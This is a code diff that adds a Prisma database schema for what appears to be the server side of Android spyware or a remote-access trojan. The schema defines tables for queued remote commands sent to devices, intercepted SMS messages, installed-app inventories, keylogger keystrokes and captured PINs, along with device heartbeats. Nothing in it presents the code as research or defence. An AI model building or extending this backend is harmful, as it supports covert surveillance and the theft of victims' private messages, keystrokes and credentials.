@@ -1,0 +1,120 @@
+// prisma/schema.prisma
+generator client {
+  provider = "prisma-client-js"
+}
+
+datasource db {
+  provider = "postgresql"
+}
+
+model Device {
+  id             Int      @id @default(autoincrement())
+  device_id      String   @unique
+  device_name    String?
+  device_model   String?
+  android_version String?
+  battery_level  Int?
+  last_seen      DateTime @default(now())
+  is_online      Boolean  @default(false)
+  created_at     DateTime @default(now())
+  
+  commands       Command[]
+  heartbeats     Heartbeat[]
+  sms            Sms[]
+  installedApps  InstalledApp[]
+  keyLogs        KeyLog[]
+  pins           Pin[]
+}
+
+model Command {
+  id           Int      @id @default(autoincrement())
+  device_id    String
+  command_type String
+  command_data Json?
+  status       CommandStatus @default(pending)
+  error        String?
+  created_at   DateTime @default(now())
+  updated_at   DateTime @default(now())
+  
+  device       Device   @relation(fields: [device_id], references: [device_id], onDelete: Cascade)
+  
+  @@index([device_id])
+  @@index([status])
+}
+
+enum CommandStatus {
+  pending
+  delivered
+  executed
+  failed
+}
+
+model Heartbeat {
+  id           Int      @id @default(autoincrement())
+  device_id    String
+  battery_level Int?
+  network_type String?
+  memory_usage Float?
+  timestamp    DateTime @default(now())
+  
+  device       Device   @relation(fields: [device_id], references: [device_id], onDelete: Cascade)
+  
+  @@index([device_id])
+  @@index([timestamp])
+}
+
+model Sms {
+  id         Int      @id @default(autoincrement())
+  device_id  String
+  address    String
+  body       String
+  date       DateTime
+  type       String
+  read       Boolean  @default(false)
+  created_at DateTime @default(now())
+  
+  device     Device   @relation(fields: [device_id], references: [device_id], onDelete: Cascade)
+  
+  @@unique([device_id, address, date])
+  @@index([device_id])
+}
+
+model InstalledApp {
+  id                  Int      @id @default(autoincrement())
+  device_id           String
+  package_name        String
+  app_name            String?
+  version_name        String?
+  version_code        Int?
+  first_install_time  DateTime?
+  last_update_time    DateTime?
+  created_at          DateTime @default(now())
+  
+  device              Device   @relation(fields: [device_id], references: [device_id], onDelete: Cascade)
+  
+  @@unique([device_id, package_name])
+  @@index([device_id])
+}
+
+model KeyLog {
+  id           Int      @id @default(autoincrement())
+  device_id    String
+  keylogger    String
+  key          String
+  current_date DateTime @default(now())
+  
+  device       Device   @relation(fields: [device_id], references: [device_id], onDelete: Cascade)
+  
+  @@index([device_id])
+}
+
+model Pin {
+  id           Int      @id @default(autoincrement())
+  device_id    String
+  pin          String
+  current_date DateTime @default(now())
+  
+  device       Device   @relation(fields: [device_id], references: [device_id], onDelete: Cascade)
+  
+  @@index([device_id])
+}
